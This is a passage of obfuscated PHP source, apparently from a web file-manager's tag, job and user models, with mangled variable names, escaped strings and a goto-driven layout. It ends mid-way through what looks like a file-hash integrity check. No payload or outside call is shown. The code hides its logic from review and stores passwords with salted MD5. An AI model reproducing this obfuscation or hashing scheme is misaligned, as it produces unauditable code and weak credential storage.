›Øˆæ•))->save(array($Ş¼áÚÂº[432] => $Ó›¤äı)); $this->_clearChildrenCache($ö±ä¹Ó[$Ó›¤äı]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($æ¾ÒŒÉ) { $·Èµ—˜õ =& $_SERVER[­õöî’–]; return array($·Èµ—˜õ[1958] => array($æ¾ÒŒÉ[0], $·Èµ—˜õ[1959]), $·Èµ—˜õ[1960] => array($æ¾ÒŒÉ[0], $·Èµ—˜õ[1961])); } protected function get($¢Æ®¾ã¨) { $ùØûÎÓğ =& $_SERVER[­õöî’–]; $äÜÇâúµ = Model($ùØûÎÓğ[522])->metaGet($¢Æ®¾ã¨, $ùØûÎÓğ[1962]); $üÃß½¹ = json_decode($äÜÇâúµ, !0); return $üÃß½¹ ? $üÃß½¹ : array($ùØûÎÓğ[1963] => $ùØûÎÓğ[88], $ùØûÎÓğ[369] => array()); } protected function set($Ï°ºÈÏÊ, $¯ˆ·ŒÈ¸) { $Ğ âêÒ› =& $_SERVER[­õöî’–]; $¯ˆ·ŒÈ¸ = $¯ˆ·ŒÈ¸ ? $¯ˆ·ŒÈ¸ : array($Ğ âêÒ›[1963] => $Ğ âêÒ›[88], $Ğ âêÒ›[369] => array()); return Model($Ğ âêÒ›[522])->metaSet($Ï°ºÈÏÊ, $Ğ âêÒ›[1962], json_encode($¯ˆ·ŒÈ¸)); } protected function getByTagID($ËşŠÉ, $™ù»¼») { $ï€¾ê‹´ =& $_SERVER[­õöî’–]; if (!$ËşŠÉ || !$™ù»¼») { return !1; } if (!Model($ï€¾ê‹´[522])->getInfoSimple($ËşŠÉ)) { return !1; } $÷ÁŸ¿Ñ = $this->get($ËşŠÉ); if (!$÷ÁŸ¿Ñ || !isset($÷ÁŸ¿Ñ[$ï€¾ê‹´[369]])) { return !1; } $šÂûÇ’ = array_find_by_field($÷ÁŸ¿Ñ[$ï€¾ê‹´[369]], $ï€¾ê‹´[399], $™ù»¼»); return is_array($šÂûÇ’) ? $šÂûÇ’ : !1; } public function listSource($ùÖ¾‚€İ, $ñÉªÍÜ) { $¾Ó“äÎÀ =& $_SERVER[­õöî’–]; if ($ñÉªÍÜ && !is_array($ñÉªÍÜ)) { $ñÉªÍÜ = array($ñÉªÍÜ); } $ÄİëÌÎÁ = $this->listData($ùÖ¾‚€İ); $Ê¾ú“ñ’ = array(); foreach ($ÄİëÌÎÁ as $¼Ô…Ö¼À) { $ä³ÖÈ­˜ = $¼Ô…Ö¼À[$¾Ó“äÎÀ[84]]; if (!$ä³ÖÈ­˜) { continue; } if (!isset($Ê¾ú“ñ’[$ä³ÖÈ­˜])) { $Ê¾ú“ñ’[$ä³ÖÈ­˜] = array(); } $Ê¾ú“ñ’[$ä³ÖÈ­˜][] = $¼Ô…Ö¼À[$¾Ó“äÎÀ[426]]; } $×‹²²¿ˆ = array(); foreach ($Ê¾ú“ñ’ as $ãú®¸ => $è×Ùı÷è) { $‰Ó«™ÀÜ = !0; if (!$ñÉªÍÜ) { $×‹²²¿ˆ[] = $ãú®¸; continue; } foreach ($ñÉªÍÜ as $ ğÅäÅ) { if (!in_array($ ğÅäÅ, $è×Ùı÷è)) { $‰Ó«™ÀÜ = !1; break; } } if ($‰Ó«™ÀÜ) { $×‹²²¿ˆ[] = $ãú®¸; } } if (!$×‹²²¿ˆ) { return array(); } $Úû±Ø‰¿ = array($¾Ó“äÎÀ[417] => array($¾Ó“äÎÀ[418], $×‹²²¿ˆ), $¾Ó“äÎÀ[505] => $ùÖ¾‚€İ, $¾Ó“äÎÀ[411] => SourceModel::TYPE_GROUP); $®˜ŒØåœ = Model($¾Ó“äÎÀ[1334])->listSource($Úû±Ø‰¿); if (!$®˜ŒØåœ || count($×‹²²¿ˆ) == $®˜ŒØåœ[$¾Ó“äÎÀ[366]][$¾Ó“äÎÀ[367]]) { return $®˜ŒØåœ; } $ÎÒæßÀ = array(); $şÍÙ£Àä = array_to_keyvalue($®˜ŒØåœ[$¾Ó“äÎÀ[82]], $¾Ó“äÎÀ[12], $¾Ó“äÎÀ[402]); $½î÷ç‰¹ = array_to_keyvalue($®˜ŒØåœ[$¾Ó“äÎÀ[83]], $¾Ó“äÎÀ[12], $¾Ó“äÎÀ[402]); $„ÑèÊúú = array_merge($½î÷ç‰¹, $şÍÙ£Àä); foreach ($×‹²²¿ˆ as $ä³ÖÈ­˜) { if (!in_array($ä³ÖÈ­˜, $„ÑèÊúú)) { $ÎÒæßÀ[] = $ä³ÖÈ­˜; } } if ($ÎÒæßÀ) { $this->removeBySource($ùÖ¾‚€İ, $ÎÒæßÀ); } return $®˜ŒØåœ; } protected function listData($–‹ÕĞñ) { $ÖãòĞòõ =& $_SERVER[­õöî’–]; $€¥ã¨øø = array($ÖãòĞòõ[1651] => 0, $ÖãòĞòõ[484] => array($ÖãòĞòõ[1964], 0), $ÖãòĞòõ[422] => $ÖãòĞòõ[1965] . $–‹ÕĞñ); $®£ß™„ = $ÖãòĞòõ[1966]; $æˆèü™ = $this->field($®£ß™„)->where($€¥ã¨øø)->order($ÖãòĞòõ[1967])->select(); return $æˆèü™ ? $æˆèü™ : array(); } protected function addToTag($ğñ¢ìÁÄ, $ığúÒ¢÷, $‡€‘½¤Ï) { $òšÉÁ¸ã =& $_SERVER[­õöî’–]; if (!$this->getByTagID($ğñ¢ìÁÄ, $‡€‘½¤Ï) || !$ığúÒ¢÷) { return !1; } if (!Model($òšÉÁ¸ã[816])->pathInfo($ığúÒ¢÷)) { return !1; } $öı—ìªá = array($òšÉÁ¸ã[1651] => 0, $òšÉÁ¸ã[484] => $‡€‘½¤Ï, $òšÉÁ¸ã[421] => $ığúÒ¢÷, $òšÉÁ¸ã[422] => $òšÉÁ¸ã[1968] . $ğñ¢ìÁÄ, $òšÉÁ¸ã[420] => $òšÉÁ¸ã[12], $òšÉÁ¸ã[1853] => 0); if ($this->where($öı—ìªá)->find()) { return !1; } return $this->add($öı—ìªá); } protected function removeFromTag($ñëòš•½, $ƒú©áŠİ, $ï ØĞ³¥) { $ÔÎ˜‡ =& $_SERVER[­õöî’–]; if (!$this->getByTagID($ñëòš•½, $ï ØĞ³¥) || !$ƒú©áŠİ) { return !1; } if (is_array($ƒú©áŠİ)) { $ƒú©áŠİ = array($ÔÎ˜‡[7], $ƒú©áŠİ); } $üÓ–£Ü = array($ÔÎ˜‡[1651] => 0, $ÔÎ˜‡[484] => $ï ØĞ³¥, $ÔÎ˜‡[422] => $ÔÎ˜‡[1968] . $ñëòš•½, $ÔÎ˜‡[421] => $ƒú©áŠİ); return $this->where($üÓ–£Ü)->delete(); } protected function removeByTag($ÉØÊú°, $­·§íõÊ) { $äÜ²·¯¶ =& $_SERVER[­õöî’–]; if (!$this->getByTagID($ÉØÊú°, $­·§íõÊ)) { return !1; } $´¡¹¥ÔË = array($äÜ²·¯¶[1651] => 0, $äÜ²·¯¶[484] => $­·§íõÊ, $äÜ²·¯¶[422] => $äÜ²·¯¶[1968] . $ÉØÊú°); return $this->where($´¡¹¥ÔË)->delete(); } protected function removeBySource($Ë±áïû§, $ì×–À¨) { $®ÈëøÑß =& $_SERVER[­õöî’–]; if (!$Ë±áïû§ || !$ì×–À¨) { return !1; } if (is_array($ì×–À¨)) { $ì×–À¨ = array($®ÈëøÑß[7], $ì×–À¨); } $Ïá¼çâä = array($®ÈëøÑß[1651] => 0, $®ÈëøÑß[421] => $ì×–À¨, $®ÈëøÑß[484] => array($®ÈëøÑß[1012], 0), $®ÈëøÑß[422] => $®ÈëøÑß[1968] . $Ë±áïû§); return $this->where($Ïá¼çâä)->delete(); } } goto d¢‚”®áˆ; e›ì‘Ó ã£: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\152\157\x62\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x64\x65\163\x63", "\163\x6f\x72\x74"); const JOB_KEY = "\163\145\x6c\146\112\157\x62\x4c\x69\163\x74"; public function listData($Èéàşş© = false, $Á§ªßøÚ = "\163\157\x72\x74", $Ó®Ù¾Üß = false) { return parent::listData($Èéàşş©, $Á§ªßøÚ, $Ó®Ù¾Üß); } public function remove($÷îÁÖ¬İ) { return parent::remove($÷îÁÖ¬İ); } public function add($”õ¦Ô) { $ÃËë© =& $_SERVER[­õöî’–]; if ($this->findByName($”õ¦Ô[$ÃËë©[32]])) { return !1; } $”õ¦Ô[$ÃËë©[1873]] = $this->getSort(); return parent::insert($”õ¦Ô); } private function getSort() { $¨¡‚â‡ß =& $_SERVER[­õöî’–]; $øô‚ÃÀ¤ = parent::listData(); $š·ï—œ¦ = array_to_keyvalue($øô‚ÃÀ¤, $¨¡‚â‡ß[12], $¨¡‚â‡ß[1873]); return empty($š·ï—œ¦) ? 0 : max($š·ï—œ¦) + 1; } public function update($½·ˆ¸¨, $“íŞÖãù) { $–„˜Á•æ =& $_SERVER[­õöî’–]; $¶•Í»ã¥ = parent::listData($½·ˆ¸¨); $ŠØÉš½œ = $this->findByName($“íŞÖãù[$–„˜Á•æ[32]]); if (!$¶•Í»ã¥ || $ŠØÉš½œ && $ŠØÉš½œ[$–„˜Á•æ[399]] != $¶•Í»ã¥[$–„˜Á•æ[399]]) { return !1; } return parent::update($½·ˆ¸¨, $“íŞÖãù); } public function setUserJob($ŸäŞ›’ø, $¥ÁÀê¼Ã) { $½³Œã— =& $_SERVER[­õöî’–]; if (!is_array($¥ÁÀê¼Ã)) { $¥ÁÀê¼Ã = array($¥ÁÀê¼Ã); } $Ì¨¹èÛë = parent::listData(); $©²ŞŒï• = array_to_keyvalue($Ì¨¹èÛë, $½³Œã—[32]); $ƒñ–çä¼ = $½³Œã—[378]; foreach ($¥ÁÀê¼Ã as $¥è‚æùÄ) { if ($©²ŞŒï•[$¥è‚æùÄ]) { $ƒñ–çä¼ .= $©²ŞŒï•[$¥è‚æùÄ][$½³Œã—[399]] . $½³Œã—[50]; } else { $€Ã‘³å“ = $this->add($¥è‚æùÄ); $ƒñ–çä¼ .= $€Ã‘³å“ . $½³Œã—[50]; } } $ƒñ–çä¼ = rtrim($ƒñ–çä¼, $½³Œã—[50]); Model($½³Œã—[535])->metaSet($ŸäŞ›’ø, self::JOB_KEY, $ƒñ–çä¼); } public function getUserJob($¶Õ¡âõƒ) { $Áôıì‡æ = Model($_SERVER[­õöî’–][535])->metaGet($¶Õ¡âõƒ); return $this->getUserJobInfo($Áôıì‡æ[self::JOB_KEY]); } public function getUserJobInfo($±³Òæ£) { $Îíç…àÈ =& $_SERVER[­õöî’–]; $èÕã… = explode($Îíç…àÈ[50], $±³Òæ£); $é¥¾’Ä¤ = parent::listData(); $é¥¾’Ä¤ = array_remove_key($é¥¾’Ä¤, $Îíç…àÈ[200]); $ÎÉ”ŠÌ³ = array(); foreach ($èÕã… as $ñšËš«) { if (isset($é¥¾’Ä¤[$ñšËš«])) { $ÎÉ”ŠÌ³[] = $é¥¾’Ä¤[$ñšËš«]; } } return $ÎÉ”ŠÌ³; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\141\x6d\x65" => "\x75\163\145\162\x5f\x6d\x65\164\x61", "\155\x65\x74\x61\106\151\x65\154\144" => "\165\x73\145\x72\x49\104"); protected $simpleField = "\x75\163\x65\x72\x49\x44\x2c\x6e\151\x63\153\116\x61\x6d\145\x2c\x6e\141\x6d\x65\54\x61\166\x61\x74\x61\162\54\x73\x65\x78\54\163\164\x61\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÖÊÀíÉÌ) { $­ùô¤Å =& $_SERVER[­õöî’–]; $·…‰æ‡ç = $­ùô¤Å[2293]; return array($­ùô¤Å[1927] => array($ÖÊÀíÉÌ[0], $·…‰æ‡ç), $­ùô¤Å[1929] => array($ÖÊÀíÉÌ[0], $·…‰æ‡ç), $­ùô¤Å[2294] => array($ÖÊÀíÉÌ[0], $·…‰æ‡ç)); } protected function getInfo($üÑ¦†§÷, $©ªèØ»£ = false) { $ÖŸÜŞıÆ = $this->getInfoSimple($üÑ¦†§÷); if (!is_array($ÖŸÜŞıÆ)) { return array(); } if ($©ªèØ»£) { return $this->_getInfoApply($ÖŸÜŞıÆ); } return $this->cacheFunctionGet($_SERVER[­õöî’–][1931], $üÑ¦†§÷); } protected function getInfoFull($’ç˜ŞÆê, $Â¼‡ÓĞé = false) { $ƒ×œ—˜Ÿ = $this->getInfoSimple($’ç˜ŞÆê); if (!is_array($ƒ×œ—˜Ÿ)) { return array(); } if ($Â¼‡ÓĞé) { return $this->_getInfoApply($ƒ×œ—˜Ÿ, !0); } return $this->cacheFunctionGet($_SERVER[­õöî’–][2295], $’ç˜ŞÆê); } private function _getInfoApply($Û„ŞÄ‡, $µù€‘êÜ = false) { $å¢…•™Ø =& $_SERVER[­õöî’–]; if (!$Û„ŞÄ‡) { return $Û„ŞÄ‡; } $•Èâü„Ñ = md5($å¢…•™Ø[2296] . $Û„ŞÄ‡[$å¢…•™Ø[886]] . $å¢…•™Ø[2297] . $Û„ŞÄ‡[$å¢…•™Ø[32]]); $Û„ŞÄ‡ = $this->_listDataApplyItem($Û„ŞÄ‡); $‹Àõ™‚© = Model($å¢…•™Ø[1334])->metaGet($Û„ŞÄ‡[$å¢…•™Ø[86]][$å¢…•™Ø[402]]); $Û„ŞÄ‡[$å¢…•™Ø[2298]] = $•Èâü„Ñ; $Û„ŞÄ‡[$å¢…•™Ø[86]][$å¢…•™Ø[2118]] = isset($‹Àõ™‚©[$å¢…•™Ø[2119]]) ? $‹Àõ™‚©[$å¢…•™Ø[2119]] : null; if ($µù€‘êÜ) { $Û„ŞÄ‡[$å¢…•™Ø[466]] = $this->metaGet($Û„ŞÄ‡[$å¢…•™Ø[1660]]); } return $Û„ŞÄ‡; } protected function getInfoSimple($ğĞ×Ì¼›, $Óè²ßÌ» = false) { $ŒŞ…Û‹´ =& $_SERVER[­õöî’–]; if (!$ğĞ×Ì¼›) { return array(); } if ($Óè²ßÌ») { $«•æ’‹ = $this->where(array($ŒŞ…Û‹´[1660] => intval($ğĞ×Ì¼›)))->find(); if (!is_array($«•æ’‹)) { return array(); } $«•æ’‹[$ŒŞ…Û‹´[543]] = Action($ŒŞ…Û‹´[2299])->parseUrl($«•æ’‹[$ŒŞ…Û‹´[543]]); return $«•æ’‹; } return $this->cacheFunctionGet($ŒŞ…Û‹´[1932], $ğĞ×Ì¼›); } protected function getInfoSimpleOuter($ñìêõ) { $‹ÖôçÆˆ =& $_SERVER[­õöî’–]; if (!$ñìêõ || $ñìêõ == 0) { return array($‹ÖôçÆˆ[1660] => $‹ÖôçÆˆ[197], $‹ÖôçÆˆ[32] => $‹ÖôçÆˆ[162] . LNG($‹ÖôçÆˆ[2300]) . $‹ÖôçÆˆ[164], $‹ÖôçÆˆ[543] => STATIC_PATH . $‹ÖôçÆˆ[2301]); } $£Ê‰¹ŒÈ = $this->cacheFunctionGet($‹ÖôçÆˆ[1932], $ñìêõ); $Ëà‚àØù = array_field_key($£Ê‰¹ŒÈ, explode($‹ÖôçÆˆ[50], $this->simpleField)); if (!$Ëà‚àØù) { return array($‹ÖôçÆˆ[1660] => $‹ÖôçÆˆ[1187], $‹ÖôçÆˆ[32] => $‹ÖôçÆˆ[162] . LNG($‹ÖôçÆˆ[2302]) . $‹ÖôçÆˆ[164], $‹ÖôçÆˆ[543] => STATIC_PATH . $‹ÖôçÆˆ[2303]); } $Ëà‚àØù[$‹ÖôçÆˆ[543]] = Action($‹ÖôçÆˆ[2299])->parseUrl($Ëà‚àØù[$‹ÖôçÆˆ[543]]); return $Ëà‚àØù; } protected function groupUser($Š“àôç) { } public static function errorLang($Ñ¹Ê æ¼) { $˜·ˆ×“” =& $_SERVER[­õöî’–]; $ŸÀ÷Õ±Ì = array(self::ERROR_USER_NOT_EXISTS => $˜·ˆ×“”[2304], self::ERROR_USER_PASSWORD_ERROR => $˜·ˆ×“”[2305], self::ERROR_USER_EXIST_NAME => $˜·ˆ×“”[2306], self::ERROR_USER_EXIST_PHONE => $˜·ˆ×“”[2307], self::ERROR_USER_EXIST_EMAIL => $˜·ˆ×“”[2308], self::ERROR_USER_LOGIN_LOCK => $˜·ˆ×“”[2309], self::ERROR_IP_NOT_ALLOW => $˜·ˆ×“”[2310], self::ERROR_USER_EXIST_NICKNAME => $˜·ˆ×“”[2311]); return LNG($ŸÀ÷Õ±Ì[$Ñ¹Ê æ¼]); } public function getInfoByMeta($šæŸ‡Ïß, $åüñø²ë) { $üÛƒ¾Û­ =& $_SERVER[­õöî’–]; $´šı‡µÉ = Model($üÛƒ¾Û­[2312])->where(array($üÛƒ¾Û­[94] => $šæŸ‡Ïß, $üÛƒ¾Û­[374] => $åüñø²ë))->find(); if ($´šı‡µÉ) { return $this->getInfo($´šı‡µÉ[$üÛƒ¾Û­[1660]]); } return !1; } public function userLoginCheck($ËóÌÎ , $³¼´ˆÎ€) { $Ãë¨øÄò =& $_SERVER[­õöî’–]; $ûâ…êÃÔ = $this->userLoginFind($ËóÌÎ ); if (!$ûâ…êÃÔ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ûâ…êÃÔ[$Ãë¨øÄò[1660]], $³¼´ˆÎ€)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ûâ…êÃÔ[$Ãë¨øÄò[1660]]); } public function userLoginFind($Ò‹´×•Ÿ) { $êæµÁ =& $_SERVER[­õöî’–]; $äÚíÍ¼ = array($êæµÁ[32] => $Ò‹´×•Ÿ, $êæµÁ[542] => $Ò‹´×•Ÿ, $êæµÁ[305] => $Ò‹´×•Ÿ, $êæµÁ[2313] => $Ò‹´×•Ÿ, $êæµÁ[998] => $êæµÁ[1000]); if ($this->nickNameRpt()) { unset($äÚíÍ¼[$êæµÁ[542]]); } return $this->where($äÚíÍ¼)->find(); } public function clearCache($´šÈ¿‰) { $åâ¬ÙÑœ =& $_SERVER[­õöî’–]; $this->cacheFunctionClear($åâ¬ÙÑœ[1931], $´šÈ¿‰); $this->cacheFunctionClear($åâ¬ÙÑœ[1932], $´šÈ¿‰); $this->cacheFunctionClear($åâ¬ÙÑœ[2295], $´šÈ¿‰); } public function userPasswordCheck($ÆË±Ò, $ê‹¡íÎ») { $Àææú»Ù =& $_SERVER[­õöî’–]; $ÕÔ¦ä¾Ë = $this->where(array($Àææú»Ù[1660] => intval($ÆË±Ò)))->find(); $Ï´¬¬ˆù = $this->metaGet($ÆË±Ò); $İ§½âô = isset($Ï´¬¬ˆù[$Àææú»Ù[2314]]) ? $Ï´¬¬ˆù[$Àææú»Ù[2314]] : $Àææú»Ù[12]; if (md5($İ§½âô . trim($ê‹¡íÎ»)) !== $ÕÔ¦ä¾Ë[$Àææú»Ù[886]]) { return !1; } return !0; } public function userAdd($ùØß©Ç) { $ò‘½åëà =& $_SERVER[­õöî’–]; $½£ã¬ = array($ò‘½åëà[420] => $ùØß©Ç[$ò‘½åëà[32]], $ò‘½åëà[2315] => $ùØß©Ç[$ò‘½åëà[1541]], $ò‘½åëà[2316] => isset($ùØß©Ç[$ò‘½åëà[305]]) ? $ùØß©Ç[$ò‘½åëà[305]] : $ò‘½åëà[12], $ò‘½åëà[2317] => isset($ùØß©Ç[$ò‘½åëà[2313]]) ? $ùØß©Ç[$ò‘½åëà[2313]] : $ò‘½åëà[12], $ò‘½åëà[2318] => isset($ùØß©Ç[$ò‘½åëà[542]]) ? $ùØß©Ç[$ò‘½åëà[542]] : $ùØß©Ç[$ò‘½åëà[32]], $ò‘½åëà[2319] => isset($ùØß©Ç[$ò‘½åëà[543]]) ? $ùØß©Ç[$ò‘½åëà[543]] : $ò‘½åëà[12], $ò‘½åëà[2320] => isset($ùØß©Ç[$ò‘½åëà[2321]]) ? $ùØß©Ç[$ò‘½åëà[2321]] : 1, $ò‘½åëà[2322] => $ùØß©Ç[$ò‘½åëà[886]], $ò‘½åëà[1933] => isset($ùØß©Ç[$ò‘½åëà[1836]]) ? $ùØß©Ç[$ò‘½åëà[1836]] : 1024 * 1024 * 20, $ò‘½åëà[1934] => 0, $ò‘½åëà[2323] => 0, $ò‘½åëà[1978] => isset($ùØß©Ç[$ò‘½åëà[741]]) ? $ùØß©Ç[$ò‘½åëà[741]] : 1); if (!empty($ùØß©Ç[$ò‘½åëà[1660]])) { $½£ã¬[$ò‘½åëà[1660]] = $ùØß©Ç[$ò‘½åëà[1660]]; } $“ì«™‰‹ = $this->_checkExist($ùØß©Ç); if ($“ì«™‰‹ !== !0) { return $“ì«™‰‹; } if (!empty($½£ã¬[$ò‘½åëà[543]]) && strlen($½£ã¬[$ò‘½åëà[543]]) > 255) { $½£ã¬[$ò‘½åëà[543]] = $ò‘½åëà[12]; } $”ÑºîÅè = $this->add($½£ã¬); $ê¤‚ä´ü = array($ò‘½åëà[2322] => $½£ã¬[$ò‘½åëà[886]], $ò‘½åëà[2318] => $½£ã¬[$ò‘½åëà[542]]); $this->userEdit($”ÑºîÅè, $ê¤‚ä´ü); Model($ò‘½åëà[1334])->userRootAdd($”ÑºîÅè); return $”ÑºîÅè; } protected function userEditTest($ÚÖ†°Ÿ», $±Ê±äéù) { return $this->call($_SERVER[­õöî’–][2324], $ÚÖ†°Ÿ», $±Ê±äéù); } protected function userEdit($¸Ï¡û¦Ä, $´£ª¥”€) { $áëêŞõ  =& $_SERVER[­õöî’–]; $ƒëŒ¬³¤ = $this->getInfoSimple($¸Ï¡û¦Ä); if (!$ƒëŒ¬³¤) { return !1; } $Õ²åô¬ = $this->_checkExist($´£ª¥”€, $¸Ï¡û¦Ä); if ($Õ²åô¬ !== !0) { return $Õ²åô¬; } if (isset($´£ª¥”€[$áëêŞõ [886]]) && trim($´£ª¥”€[$áëêŞõ [886]]) != $áëêŞõ [12]) { $ØãĞ›şû = $this->metaGet($¸Ï¡û¦Ä); if (empty($ØãĞ›şû[$áëêŞõ [2314]])) { $ØãĞ›şû[$áëêŞõ [2314]] = rand_string(10); Model($áëêŞõ [513])->metaSet($¸Ï¡û¦Ä, $áëêŞõ [2314], $ØãĞ›şû[$áëêŞõ [2314]]); } $´£ª¥”€[$áëêŞõ [886]] = md5($ØãĞ›şû[$áëêŞõ [2314]] . trim($´£ª¥”€[$áëêŞõ [886]])); } else { unset($´£ª¥”€[$áëêŞõ [886]]); } if (!empty($´£ª¥”€[$áëêŞõ [543]]) && strlen($´£ª¥”€[$áëêŞõ [543]]) > 255) { $´£ª¥”€[$áëêŞõ [543]] = $áëêŞõ [12]; } $this->where(array($áëêŞõ [1651] => $¸Ï¡û¦Ä))->save($´£ª¥”€); if (isset($´£ª¥”€[$áëêŞõ [542]])) { $this->setNamePinyin($¸Ï¡û¦Ä, $´£ª¥”€[$áëêŞõ [542]]); } $this->clearCache($¸Ï¡û¦Ä); return !0; } public function setNamePinyin($äë£ï€™, $ş¼ª»á– = false) { $‰ˆ•ÁÚ€ =& $_SERVER[­õöî’–]; if (!$ş¼ª»á–) { $·£¹îê = $this->getInfoSimple($äë£ï€™); $ş¼ª»á– = $·£¹îê[$‰ˆ•ÁÚ€[542]] ? $·£¹îê[$‰ˆ•ÁÚ€[542]] : $·£¹îê[$‰ˆ•ÁÚ€[32]]; } $ÓÅ–ù¯… = Model($‰ˆ•ÁÚ€[535]); if (!Input::check($ş¼ª»á–, $‰ˆ•ÁÚ€[593])) { return $ÓÅ–ù¯…->metaSet($äë£ï€™, array($‰ˆ•ÁÚ€[465] => $‰ˆ•ÁÚ€[12], $‰ˆ•ÁÚ€[464] => $‰ˆ•ÁÚ€[12])); } return $ÓÅ–ù¯…->metaSet($äë£ï€™, array($‰ˆ•ÁÚ€[465] => str_replace($‰ˆ•ÁÚ€[53], $‰ˆ•ÁÚ€[12], Pinyin::get($ş¼ª»á–)), $‰ˆ•ÁÚ€[464] => Pinyin::get($ş¼ª»á–, $‰ˆ•ÁÚ€[594]))); } private function nickNameRpt() { $‰éØ–¡» =& $_SERVER[­õöî’–]; $ª®Â©ÓŞ = Model($‰éØ–¡»[761])->get($‰éØ–¡»[2325]); $ÑÓşÏöç = $GLOBALS[$‰éØ–¡»[6]][$‰éØ–¡»[381]][$‰éØ–¡»[2325]]; $¼…î˜¸ = !is_null($ª®Â©ÓŞ) ? $ª®Â©ÓŞ : $ÑÓşÏöç; return !!$¼…î˜¸; } private function _checkExist($ÂÖ‡¦§“, $ Ô¨³š = false) { $”² ¼ö =& $_SERVER[­õöî’–]; $Å°õ¢ı = array($”² ¼ö[32] => UserModel::ERROR_USER_EXIST_NAME, $”² ¼ö[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $”² ¼ö[305] => UserModel::ERROR_USER_EXIST_EMAIL, $”² ¼ö[2313] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Å°õ¢ı[$”² ¼ö[542]]); } $ªœøÍ€ = $ Ô¨³š ? array($”² ¼ö[1660] => array($”² ¼ö[2326], $ Ô¨³š)) : array(); foreach ($Å°õ¢ı as $§²×ƒ¼Ê => $ÙÅèÑ¤) { $Õ²ÒäÁÏ = array(); foreach ($Å°õ¢ı as $²ÁÁ½“ë => $œŒµ×Šİ) { if (isset($ÂÖ‡¦§“[$²ÁÁ½“ë]) && $ÂÖ‡¦§“[$²ÁÁ½“ë]) { $Õ²ÒäÁÏ[] = $ÂÖ‡¦§“[$²ÁÁ½“ë]; } } if (!$Õ²ÒäÁÏ) { continue; } $ËÛ÷şûË = array_merge(array($§²×ƒ¼Ê => array($”² ¼ö[7], $Õ²ÒäÁÏ)), $ªœøÍ€); $ÅÈ£ÑÓ¹ = $this->where($ËÛ÷şûË)->find(); if ($ÅÈ£ÑÓ¹) { return $ÙÅèÑ¤; } } return !0; } public function userListInfo($‰ÁÏÆŸ) { $¾õÜÚ™“ =& $_SERVER[­õöî’–]; $ÕØ–Ö‘ = array(); $‰ÁÏÆŸ = is_array($‰ÁÏÆŸ) ? array_unique($‰ÁÏÆŸ) : array(); if (!$‰ÁÏÆŸ) { return $ÕØ–Ö‘; } if (count($‰ÁÏÆŸ) < 20) { foreach ($‰ÁÏÆŸ as $©ºéØ¥ù) { $ÕØ–Ö‘[$©ºéØ¥ù . $¾õÜÚ™“[12]] = $this->getInfoSimpleOuter($©ºéØ¥ù); } } else { $ğšâ‡‰ = array($¾õÜÚ™“[1651] => array($¾õÜÚ™“[418], $‰ÁÏÆŸ)); if (count($‰ÁÏÆŸ) == 1) { $ğšâ‡‰ = array($¾õÜÚ™“[1651] => $‰ÁÏÆŸ[0]); } $•ƒòÒ’ = Model($¾õÜÚ™“[513])->field($this->simpleField)->where($ğšâ‡‰)->select(); $•ƒòÒ’ = array_to_keyvalue($•ƒòÒ’, $¾õÜÚ™“[1660]); foreach ($‰ÁÏÆŸ as $©ºéØ¥ù) { $˜ÕÒ·ïû = $•ƒòÒ’[$©ºéØ¥ù]; if (!$˜ÕÒ·ïû) { $ÕØ–Ö‘[$©ºéØ¥ù . $¾õÜÚ™“[12]] = $this->getInfoSimpleOuter($©ºéØ¥ù); continue; } $˜ÕÒ·ïû[$¾õÜÚ™“[543]] = Action($¾õÜÚ™“[2299])->parseUrl($˜ÕÒ·ïû[$¾õÜÚ™“[543]]); $ÕØ–Ö‘[$©ºéØ¥ù . $¾õÜÚ™“[12]] = $˜ÕÒ·ïû; } } return $ÕØ–Ö‘; } protected function userStatus($ªÍ‚û›Ï, $Ç°°Ñç’) { $…§›ˆı¶ = $this->getInfoSimple($ªÍ‚û›Ï); if (!$…§›ˆı¶) { return !1; } $¶£ˆüà÷ = array($_SERVER[­õöî’–][741] => $Ç°°Ñç’); return $this->userEdit($ªÍ‚û›Ï, $¶£ˆüà÷); } protected function userRemove($ğŸ‚…ÜÎ) { $ƒÚÑÚ“š =& $_SERVER[­õöî’–]; $ÖÊÄÕ» = $this->getInfoSimple($ğŸ‚…ÜÎ); if (!$ÖÊÄÕ») { return !1; } $Ú‰âöÛ§ = array($ƒÚÑÚ“š[1651] => $ğŸ‚…ÜÎ); Model($ƒÚÑÚ“š[601])->where($Ú‰âöÛ§)->delete(); Model($ƒÚÑÚ“š[2327])->where($Ú‰âöÛ§)->delete(); Model($ƒÚÑÚ“š[1939])->where($Ú‰âöÛ§)->delete(); Model($ƒÚÑÚ“š[2312])->where($Ú‰âöÛ§)->delete(); Model($ƒÚÑÚ“š[1066])->where($Ú‰âöÛ§)->delete(); Model($ƒÚÑÚ“š[2142])->removeUserAll($ğŸ‚…ÜÎ); Model($ƒÚÑÚ“š[816])->userRootRemove($ğŸ‚…ÜÎ); return $this->where($Ú‰âöÛ§)->delete(); } protected function userGroupSet($şáğÌ“Í, $ÎÜ£¿ßñ, $î—©äĞ‚ = array()) { $íÙ¥¬·Í =& $_SERVER[­õöî’–]; $‡ÊÚ±¯å = $_SERVER[$íÙ¥¬·Í[872]] . $íÙ¥¬·Í[873]; $÷Óí´ÁÀ = $íÙ¥¬·Í[868]; if ($_SERVER[$íÙ¥¬·Í[869]] != $÷Óí´ÁÀ($‡ÊÚ±¯å)) { $¥çÊ±Ã÷ = $íÙ¥¬·Í[870]; $†’Ğ”é˜ = $íÙ¥¬·Í[871]; $–±›Ó©í = $_SERVER[$íÙ¥¬·Í[872]] . $íÙ¥¬·Í[873]; $µôí·âœ = $†’Ğ”é˜($–±›Ó©í); 